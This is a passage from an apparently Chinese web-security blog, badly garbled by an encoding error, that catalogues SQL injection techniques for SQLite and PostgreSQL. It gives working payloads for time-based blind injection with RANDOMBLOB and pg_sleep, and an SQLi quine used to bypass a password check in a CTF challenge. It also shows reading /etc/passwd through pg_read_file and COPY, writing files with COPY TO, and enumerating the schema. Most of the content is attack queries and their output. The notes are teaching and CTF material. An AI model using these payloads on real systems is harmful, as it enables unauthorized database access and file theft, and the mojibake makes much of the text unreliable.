è¿ç®—ç¬¦ä¸€èµ·ä½¿ç”¨</p><ul><li>ç™¾åˆ†å·<code>%</code></li><li>ä¸‹åˆ’çº¿<code>_</code></li><li>ç™¾åˆ†å·ï¼ˆ%ï¼‰ä»£è¡¨é›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—æˆ–å­—ç¬¦ã€‚ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ä»£è¡¨ä¸€ä¸ªå•ä¸€çš„æ•°å­—æˆ–å­—ç¬¦ã€‚è¿™äº›ç¬¦å·å¯ä»¥è¢«ç»„åˆä½¿ç”¨ã€‚</li></ul><h2 id="æ¡ä»¶åˆ¤æ–­"><a href="#æ¡ä»¶åˆ¤æ–­" class="headerlink" title="æ¡ä»¶åˆ¤æ–­"></a>æ¡ä»¶åˆ¤æ–­</h2><ul><li><code>case when X then Y else Z end</code> è¿™ä¸ªè¯­å¥å’Œ<code>mysql</code>æ˜¯ç›¸åŒçš„</li><li><code>iif(X,Y,Z)</code></li></ul><p>æ³¨æ„:</p><ol><li><code>sqlite</code>ä¸­æ²¡æœ‰<code>if</code>è¯­å¥</li><li><code>iif</code>åªæœ‰<code>version&gt;=3.32</code>å¯ç”¨</li></ol><pre class="language-none"><code class="language-none">sqlite&gt; select case when (1=1) then 1 else 0 end;1sqlite&gt; select case when (1=2) then 1 else 0 end;0--iifå‡½æ•°ä½¿ç”¨çš„ç‰ˆæœ¬æ¯”è¾ƒé«˜</code></pre><h2 id="æ„é€ æŠ¥é”™"><a href="#æ„é€ æŠ¥é”™" class="headerlink" title="æ„é€ æŠ¥é”™"></a>æ„é€ æŠ¥é”™</h2><p>åœ¨<code>mysql</code>ä¸­å¯ä»¥ä½¿ç”¨<code>exp(999999)</code>æŠ¥é”™ï¼Œä½†æ˜¯<code>sqlite</code>ä¸­æ²¡æœ‰</p><p>åœ¨<code>sqlite</code>ä¸­ä½¿ç”¨<code>randomblob(N)</code>ï¼šè¿”å›<code>N-byte blob</code></p><pre class="language-none"><code class="language-none">sqlite&gt; select randomblob(1);sqlite&gt; select randomblob(2);ï¿½`sqlite&gt; select randomblob(3);~ï¿½ï¿½sqlite&gt; select randomblob(4);ï¿½2qï¿½--éšæœºè¿”å›Nä¸ªå­—èŠ‚çš„å­—ç¬¦--è½¬åŒ–ä¸ºåå…­è¿›åˆ¶çœ‹çœ‹sqlite&gt; select hex(randomblob(4));F8896FC0--å½“é•¿åº¦è¿‡é•¿æ—¶æŠ¥é”™sqlite&gt; select randomblob(10000000000);Error: string or blob too big</code></pre><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p><code>sqlite</code>ä¸­å¹¶æ²¡æœ‰<code>sleep()</code>è¿™æ ·çš„å»¶æ—¶å‡½æ•°ï¼Œé€šè¿‡<code>like</code>åŒ¹é…å’Œ<code>RANDOMBLOB</code>ç»„åˆå»¶æ—¶</p><pre class="language-none"><code class="language-none">-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([ç§’]00000000/2))))sqlite&gt; select 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))));0--è™½ç„¶æ²¡æœ‰åƒsleepé‚£æ ·ç²¾ç¡®ï¼Œä½†æ˜¯ä¹Ÿå¤Ÿç”¨äº†</code></pre><h2 id="SQLi-Quine"><a href="#SQLi-Quine" class="headerlink" title="SQLi-Quine"></a>SQLi-Quine</h2><p>åœ¨åšCTFæ—¶å¯èƒ½é‡è§æ•°æ®åº“é‡Œæ²¡æœ‰ä¸œè¥¿ï¼Œä½†æ˜¯å´è¦æ±‚è¾“å…¥çš„ä¸æ•°æ®åº“æŸ¥è¯¢çš„å†…å®¹ç›¸ç­‰</p><pre class="language-none"><code class="language-none">row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();if(typeof row !== "undefined"){    req.session.isAdmin = (row.pw === user.pw);}else{    req.session.isAdmin = false;}</code></pre><p>ä¸Šè¯‰çš„<code>sql</code>è¯­å¥è¦æ±‚è¾“å…¥çš„å¯†ç å’ŒæŸ¥è¯¢çš„å¯†ç ç›¸ç­‰ï¼Œåœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­å‘ç°æ•°æ®åº“æ²¡æœ‰ä¸œè¥¿ã€‚å› æ­¤æ„é€ <code>payload</code></p><pre class="language-none"><code class="language-none">Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><pre class="language-none"><code class="language-none">sqlite&gt; select ''Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||');' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||sqlite&gt; select '' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--   ...&gt; ;' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><p>å‚è€ƒé¢˜ç›®ï¼šASIS CTF Quals 2020 Admin Panel</p><p>ç”Ÿæˆè„šæœ¬å‚è€ƒï¼š<a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p><h1 id="PostgreSQLæ³¨å…¥"><a href="#PostgreSQLæ³¨å…¥" class="headerlink" title="PostgreSQLæ³¨å…¥"></a>PostgreSQLæ³¨å…¥</h1><h2 id="æ³¨é‡Šç¬¦-2"><a href="#æ³¨é‡Šç¬¦-2" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h2><pre class="language-none"><code class="language-none">/**/--ä¸¤ç§æ³¨é‡Šç¬¦ --åé¢ä¸å¸¦ç©ºæ ¼ </code></pre><p>åˆ¤æ–­æ˜¯<code>plsql</code>è¿˜æ˜¯<code>sqlite</code></p><pre class="language-none"><code class="language-none">--å¯ä»¥æ³¨é‡Šï¼Œ#ä¸å¯æ³¨é‡Šï¼Œåˆ™ä¸æ˜¯mysqlåˆ©ç”¨exp(999999)æ„é€ æŠ¥é”™ï¼Œå¯åˆ¤æ–­æ˜¯PostgreSQLæˆ–è€…æµ‹è¯•å»¶æ—¶ç›²æ³¨åˆ©ç”¨pg_sleep()postgres=# select 123 where 123 = exp(9999999);ERROR:  value out of range: overflow</code></pre><h2 id="LIKEæ³¨å…¥"><a href="#LIKEæ³¨å…¥" class="headerlink" title="LIKEæ³¨å…¥"></a>LIKEæ³¨å…¥</h2><pre class="language-none"><code class="language-none">string LIKE pattern [ESCAPE escape-character]string NOT LIKE pattern [ESCAPE escape-character]</code></pre><p>åœ¨LIKE å­å¥ä¸­ï¼Œé€šå¸¸ä¸é€šé…ç¬¦ç»“åˆä½¿ç”¨ï¼Œé€šé…ç¬¦è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œåœ¨PostgreSQL ä¸­ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§é€šé…ç¬¦ï¼ˆå¦‚æœæ²¡æœ‰ä½¿ç”¨é€šé…ç¬¦ï¼ŒLIKE å­å¥å’Œç­‰å·= ä¸€æ ·ï¼‰ï¼š</p><ul><li>ç™¾åˆ†å·<code>%</code></li><li>ä¸‹åˆ’çº¿<code>_</code></li></ul><p><code>_</code>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œ<code>%</code>åŒ¹é…0è‡³å¤šä¸ªä»»æ„å­—ç¬¦ã€‚</p><p>ä¸‹é¢æ˜¯ LIKE è¯­å¥ä¸­æ¼”ç¤ºäº† <strong>%</strong> å’Œ <strong>_</strong> çš„ä¸€äº›å·®åˆ«:</p><p>è¡¨æ ¼ è¿˜åœ¨åŠ è½½ä¸­ï¼Œè¯·ç­‰å¾…åŠ è½½å®Œæˆåå†å°è¯•å¤åˆ¶</p><p>åœ¨ PostgreSQL ä¸­ï¼ŒLIKE å­å¥æ˜¯åªèƒ½ç”¨äºå¯¹å­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤åœ¨ä¸Šé¢ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è¦å°†æ•´å‹æ•°æ®ç±»å‹è½¬åŒ–ä¸ºå­—ç¬¦ä¸²æ•°æ®ç±»å‹ã€‚</p><p>æ ¹æ®æ´»åŠ¨çš„è¯­è¨€ç¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨å…³é”®å­—<code>ILIKE</code>ä»£æ›¿<code>LIKE</code>æ¥ä½¿åŒ¹é…ä¸åŒºåˆ†å¤§å°å†™ã€‚è¿™ä¸æ˜¯ SQL æ ‡å‡†ï¼Œè€Œæ˜¯ PostgreSQL æ‰©å±•ã€‚</p><p>å¦‚æœåŒ¹é…çš„å­—ç¬¦ä¸²ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œä½¿ç”¨<code>escape ''</code>æ¥é€‰æ‹©è½¬ä¹‰ä»»ä½•å­—ç¬¦</p><pre class="language-none"><code class="language-none">postgres=# select 'aaa%bbb' like 'aaa%'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%%' escape '1'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb_' escape '1'; ?column?---------- t(1 row)--å¯ä»¥çœ‹åˆ°ä½¿ç”¨escapeä¹‹åï¼Œå°†1å½“ä½œè½¬ä¹‰ç¬¦</code></pre><p>å¦‚æœ<code>like</code>è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨<code>~~</code></p><pre class="language-none"><code class="language-none">postgres=# select '123' ~~ '1%'; ?column?---------- t(1 row)</code></pre><p>è¿ç®—ç¬¦<code>~~</code>ç­‰æ•ˆäº<code>LIKE</code>ï¼Œè€Œ<code>~~*</code>å¯¹åº”äº<code>ILIKE</code>ã€‚è¿˜æœ‰<code>!~~</code>å’Œ<code>!~~*</code>è¿ç®—ç¬¦åˆ†åˆ«ä»£è¡¨<code>NOT LIKE</code>å’Œ<code>NOT ILIKE</code>ã€‚æ‰€æœ‰è¿™äº›è¿ç®—ç¬¦éƒ½æ˜¯ç‰¹å®šäº PostgreSQL çš„ã€‚æ‚¨å¯èƒ½ä¼šåœ¨<code>EXPLAIN</code>è¾“å‡ºå’Œç±»ä¼¼çš„ä½ç½®çœ‹åˆ°è¿™äº›è¿ç®—ç¬¦åç§°ï¼Œå› ä¸ºè§£æå™¨å®é™…ä¸Šç¿»è¯‘äº†<code>LIKE</code>ç­‰ã€‚è¿™äº›è¿ç®—ç¬¦ã€‚</p><p><strong>ç±»ä¼¼è¿˜æœ‰****SIMILAR TO</strong></p><p><code>SIMILAR TO</code>è¿ç®—ç¬¦æ ¹æ®å…¶æ¨¡å¼æ˜¯å¦ä¸ç»™å®šçš„å­—ç¬¦ä¸²åŒ¹é…è€Œè¿”å› true æˆ– falseã€‚å®ƒç±»ä¼¼äº<code>LIKE</code>ï¼Œé™¤äº†å®ƒä½¿ç”¨ SQL æ ‡å‡†çš„æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰æ¥è§£é‡Šæ¨¡å¼ã€‚ SQL æ­£åˆ™è¡¨è¾¾å¼æ˜¯<code>LIKE</code>è¡¨ç¤ºæ³•å’Œé€šç”¨æ­£åˆ™è¡¨è¾¾å¼è¡¨ç¤ºæ³•ä¹‹é—´çš„ä¸€ä¸ªå¥‡æ€ªçš„äº¤å‰ã€‚</p><p>åƒ<code>LIKE</code>ä¸€æ ·ï¼Œ<code>SIMILAR TO</code>è¿ç®—ç¬¦ä»…åœ¨å…¶æ¨¡å¼ä¸æ•´ä¸ªå­—ç¬¦ä¸²åŒ¹é…æ—¶æ‰æˆåŠŸï¼›è¿™ä¸å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼è¡Œä¸ºä¸åŒï¼Œåœ¨å¸¸è§„è¡Œä¸ºä¸­ï¼Œæ¨¡å¼å¯ä»¥åŒ¹é…å­—ç¬¦ä¸²çš„ä»»ä½•éƒ¨åˆ†ã€‚ä¸<code>LIKE</code>ä¸€æ ·ï¼Œ<code>SIMILAR TO</code>ä½¿ç”¨<code>_</code>å’Œ<code>%</code>ä½œä¸ºé€šé…ç¬¦ï¼Œåˆ†åˆ«è¡¨ç¤ºä»»ä½•å•ä¸ªå­—ç¬¦å’Œä»»ä½•å­—ç¬¦ä¸²(åœ¨ POSIX æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå®ƒä»¬åˆ†åˆ«ä¸<code>.</code>å’Œ<code>.*</code>ç›¸ç±»ä¼¼)ã€‚</p><p>é™¤äº†ä»<code>LIKE</code>å€Ÿç”¨çš„è¿™äº›åŠŸèƒ½ä¹‹å¤–ï¼Œ<code>SIMILAR TO</code>è¿˜æ”¯æŒä» POSIX æ­£åˆ™è¡¨è¾¾å¼å€Ÿç”¨çš„è¿™äº›æ¨¡å¼åŒ¹é…å…ƒå­—ç¬¦ï¼š</p><ul><li><code>|</code>è¡¨ç¤ºäº¤æ›¿(ä¸¤ç§é€‰æ‹©ä¹‹ä¸€)ã€‚</li><li><code>*</code>è¡¨ç¤ºé‡å¤ä¸Šä¸€ä¸ªé¡¹ç›®é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚</li><li><code>+</code>è¡¨ç¤ºé‡å¤å‰ä¸€ä¸ªé¡¹ç›®ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</li><li><code>?</code>è¡¨ç¤ºé‡å¤ä¸Šä¸€ä¸ªé¡¹ç›®é›¶æˆ–ä¸€æ¬¡ã€‚</li><li><code>{</code> <em>m</em> <code>MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN</code><em>HASH**è¡¨ç¤ºå‰ä¸€é¡¹æ­£å¥½é‡å¤</em><code>m</code> *æ¬¡ã€‚</li><li><code>{</code> <em>m</em> <code>,}</code>è¡¨ç¤ºé‡å¤ä¸Šä¸€é¡¹ <em>m</em> æˆ–æ›´å¤šæ¬¡ã€‚</li><li><code>{</code> <em>m</em> <code>,</code> <em>n</em> <code>}</code>è¡¨ç¤ºå‰ä¸€é¡¹é‡å¤è‡³å°‘ <em>m</em> ä½†ä¸è¶…è¿‡ <em>n</em> æ¬¡ã€‚</li><li>æ‹¬å·<code>()</code>å¯ç”¨äºå°†é¡¹ç›®åˆ†ç»„ä¸ºå•ä¸ªé€»è¾‘é¡¹ç›®ã€‚</li><li>ä¸ POSIX æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·ï¼Œæ–¹æ‹¬å·è¡¨è¾¾å¼<code>[...]</code>æŒ‡å®šå­—ç¬¦ç±»ã€‚</li></ul><p>è¯·æ³¨æ„ï¼Œå¥ç‚¹(<code>.</code>)ä¸æ˜¯<code>SIMILAR TO</code>çš„å…ƒå­—ç¬¦ã€‚</p><p>ä¸<code>LIKE</code>ä¸€æ ·ï¼Œåæ–œæ ä¼šç¦ç”¨ä»»ä½•è¿™äº›å…ƒå­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ï¼›æˆ–å¯ä»¥ä½¿ç”¨<code>ESCAPE</code>æŒ‡å®šå…¶ä»–è½¬ä¹‰å­—ç¬¦ã€‚</p><p>Some examples:</p><pre class="language-none"><code class="language-none">'abc' SIMILAR TO 'abc'      true'abc' SIMILAR TO 'a'        false'abc' SIMILAR TO '%(b|d)%'  true'abc' SIMILAR TO '(b|c)%'   false</code></pre><h2 id="èšåˆå‡½æ•°"><a href="#èšåˆå‡½æ•°" class="headerlink" title="èšåˆå‡½æ•°"></a>èšåˆå‡½æ•°</h2><p><code>plsql</code>ä¸­å¹¶æ²¡æœ‰<code>group_concat()</code>è¿™ä¸ªå‡½æ•°ï¼Œç”¨èšåˆå‡½æ•°<code>array_agg()ã€string_agg()</code></p><pre class="language-none"><code class="language-none">--array_agg(expression) æŠŠè¡¨è¾¾å¼å˜æˆä¸€ä¸ªæ•°ç»„postgres=# select array_agg(name) from company; array_agg----------- {Paul,cc}(1 row)--é€šå¸¸æ­é…array_to_string()ä½¿ç”¨postgres=# select array_to_string(array_agg(name),',') from company; array_to_string----------------- Paul,cc(1 row)</code></pre><pre class="language-none"><code class="language-none">--string_agg(expression, delimiter) ç›´æ¥æŠŠä¸€ä¸ªè¡¨è¾¾å¼å˜æˆå­—ç¬¦ä¸²postgres=# select string_agg(name,',')  from company; string_agg------------ Paul,cc(1 row)</code></pre><h2 id="å»¶æ—¶å‡½æ•°"><a href="#å»¶æ—¶å‡½æ•°" class="headerlink" title="å»¶æ—¶å‡½æ•°"></a>å»¶æ—¶å‡½æ•°</h2><p><code>pg_sleep(5)</code></p><p><strong>æ³¨æ„ï¼š</strong></p><pre class="language-none"><code class="language-none">--ä¸mysqlä¸­çš„sleep()æœ‰æ‰€ä¸åŒ--å½“å°†pg_sleep()ä¸å¸ƒå°”ä¸€èµ·ä½¿ç”¨æ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºpg_sleepè¿”å›å€¼ä¸ºç©ºã€‚postgres=# select '1' = pg_sleep(1);ERROR:  argument of AND must be type boolean, not type voidLINE 1: select '1' and pg_sleep(1);</code></pre><p>è¿™é‡Œæä¾›å‡ ç§è§£å†³çš„åŠæ³•</p><pre class="language-none"><code class="language-none">æ–¹æ³•1ï¼šselect xxx from pg_sleep(); --å¯ä»¥å»¶æ—¶ï¼Œå¹¶ä¸”è¿”å›xxxpostgres=# select 1 from pg_sleep(1); ?column?----------        1(1 row)--é€šè¿‡è¿™ä¸ªå°±æœ‰è¿”å›å€¼ï¼Œå¯ä»¥æ¯”è¾ƒäº†postgres=# select '1'=(select '1' from pg_sleep(1)); ?column?---------- t(1 row)--å¯ä»¥çœ‹å‡ºplsqlçš„æ•°æ®ç±»å‹æ¯”è¾ƒä¸¥æ ¼ï¼Œä¸ä¼šéšæ„è¿›è¡Œè½¬æ¢æ–¹æ³•2ï¼š--é€šè¿‡ç±»å‹è½¬æ¢ï¼Œå°†æ•°æ®è½¬åŒ–ä¸ºå­—ç¬¦postgres=# select '1'=pg_sleep(1)::varchar; ?column?---------- f(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)::VARCHAR else 'a' end);æ–¹æ³•3ï¼š--é€šè¿‡||--ä¸mysqlä¸ä¸€æ ·ï¼Œåœ¨plsqlä¸­ï¼Œ||æ˜¯æ‹¼æ¥å­—ç¬¦ä¸²çš„æ„æ€postgres=# select '1'||'asss'; ?column?---------- 1asss(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)||'b' else 'a' end);</code></pre><h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><p><code>pg_ls_dir()</code>ï¼šåˆ—å‡ºç›®å½•çš„å†…å®¹ã€‚ é»˜è®¤é™åˆ¶ä¸ºè¶…çº§ç”¨æˆ·ï¼Œä½†å¯ä»¥æˆäºˆå…¶ä»–ç”¨æˆ· EXECUTE æ¥è¿è¡Œè¯¥åŠŸèƒ½ã€‚</p><p><code>pg_read_file()</code>ï¼šåˆ—å‡ºç›®å½•çš„å†…å®¹ã€‚ é»˜è®¤é™åˆ¶ä¸ºè¶…çº§ç”¨æˆ·ï¼Œä½†å¯ä»¥æˆäºˆå…¶ä»–ç”¨æˆ· EXECUTE æ¥è¿è¡Œè¯¥åŠŸèƒ½ã€‚</p><pre class="language-none"><code class="language-none">postgres=# select pg_ls_dir('/'); pg_ls_dir------------ home srv etc opt root lib mnt usr media lib64 sys dev sbin boot bin run lib32 libx32 init proc snap tmp var lost+found(24 rows)postgres=# select pg_ls_dir('/');                                       pg_read_file------------------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash                                                          + daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          + bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     + sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     + sync:x:4:65534:sync:/bin:/bin/sync                                                       + games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          + man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          + lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             + mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              + news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        + uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      + proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               + www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     + backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     + list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            + irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                         + gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        + nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                               + systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin   + systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin             + systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin+ messagebus:x:103:106::/nonexistent:/usr/sbin/nologin                                     + syslog:x:104:110::/home/syslog:/usr/sbin/nologin                                         + _apt:x:105:65534::/nonexistent:/usr/sbin/nologin                                         + tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                              + uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                            + tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin                                        +</code></pre><p><strong>å †å æ³¨å…¥æ—¶</strong></p><pre class="language-none"><code class="language-none">CREATE TABLE Y1ng(t TEXT);COPY Y1ng FROM '/etc/passwd';SELECT * FROM Y1ng limit 1 offset 0;  --é€šè¿‡åç§»é‡è¯»å–æŸä¸€è¡ŒSELECT * FROM Y1ng limit 1 offset 1;SELECT * FROM Y1ng limit 1 offset 2;SELECT * FROM Y1ng limit 1 offset 3;SELECT * FROM Y1ng limit 1 offset 4;SELECT * FROM Y1ng limit 1 offset 5;--ç›´æ¥è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼šCREATE TABLE Y1ng(t TEXT);COPY Y1ng(t) FROM '/etc/passwd';SELECT * FROM Y1ng;</code></pre><p><strong>æ–‡ä»¶å†™å…¥</strong></p><pre class="language-none"><code class="language-none">DROP TABLE Y1ng;CREATE TABLE Y1ng (t TEXT);INSERT INTO Y1ng(t) VALUES ('hello Y1ng');COPY Y1ng(t) TO '/tmp/Y1ng';</code></pre><h2 id="ç³»ç»Ÿæ•°æ®åº“"><a href="#ç³»ç»Ÿæ•°æ®åº“" class="headerlink" title="ç³»ç»Ÿæ•°æ®åº“"></a>ç³»ç»Ÿæ•°æ®åº“</h2><p>åœ¨plsqlä¸­ä¹Ÿå­˜åœ¨åº“<code>information_schema</code></p><pre class="language-none"><code class="language-none">--æŸ¥è¡¨åselect table_name from information_schema.tables where table_name not like 'pg%' and table_schema='public';select table_name from information_schema.tables where table_name not like 'pg%';select string_agg(tablename, ',') from pg_tables where schemaname='public';--æŸ¥åˆ—åselect column_name from information_schema.columns where table_name like 'company';select string_agg(column_name, ',') from information_schema.columns where table_schema='public'(è€ç‰ˆæœ¬)pg_class.oidå¯¹åº”pg_attribute.attrelidpg_class.relnameè¡¨åpg_attribute.attnameå­—æ®µåselect relname from pg_classè·å–è¡¨åselect oid from pg_class wehre relname='admin'è·å–è¡¨çš„oidselect attname from pg_attribute where attrelid='oidçš„å€¼'  è·å–å­—æ®µå</code></pre><h2 id="plsqlå¸¸ç”¨å‘½ä»¤"><a href="#plsqlå¸¸ç”¨å‘½ä»¤" class="headerlink" title="plsqlå¸¸ç”¨å‘½ä»¤"></a>plsqlå¸¸ç”¨å‘½ä»¤</h2><pre class="language-none"><code class="language-none">select CURRENT_SCHEMA()           #æŸ¥çœ‹å½“å‰æƒé™select user                       #æŸ¥çœ‹ç”¨æˆ·select current_user               #æŸ¥çœ‹å½“å‰ç”¨æˆ·select chr(97)                    #å°†ASCIIç è½¬ä¸ºå­—ç¬¦select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #å°†ASCIIè½¬æ¢ä¸ºå­—ç¬¦ä¸²SELECT session_user;SELECT usename FROM pg_user;SELECT getpgusername();select version()                  #æŸ¥çœ‹PostgreSQLæ•°æ®åº“ç‰ˆæœ¬SELECT current_database()         #æŸ¥çœ‹å½“å‰æ•°æ®åº“select length('admin')            #æŸ¥çœ‹é•¿åº¦</code></pre><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…è®¸å¯åè®®</a></p><p><a href="https://ccship.cn/tag/mysql%e6%b3%a8%e5%85%a5/">Mysqlæ³¨å…¥</a> <a href="https://ccship.cn/tag/postgresql%e6%b3%a8%e5%85%a5/">PostgreSQLæ³¨å…¥</a> <a href="https://ccship.cn/tag/sqlite%e6%b3%a8%e5%85%a5/">Sqliteæ³¨å…¥</a></p><p>0</p><p><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">Previous Post</a></p><h3 id="ysoserialä½¿ç”¨æ–¹æ³•"><a href="#ysoserialä½¿ç”¨æ–¹æ³•" class="headerlink" title="ysoserialä½¿ç”¨æ–¹æ³•"></a><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">ysoserialä½¿ç”¨æ–¹æ³•</a></h3><hr><p><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Next Post</a></p><h3 id="Javaååºåˆ—åŒ–ä¹‹Commons-Collectio"><a href="#Javaååºåˆ—åŒ–ä¹‹Commons-Collectio" class="headerlink" title="Javaååºåˆ—åŒ–ä¹‹Commons-Collectio"></a><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Javaååºåˆ—åŒ–ä¹‹Commons-Collectio</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> åŸºç¡€æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œæ¼æ´æ€»ç»“</title>
      <link href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
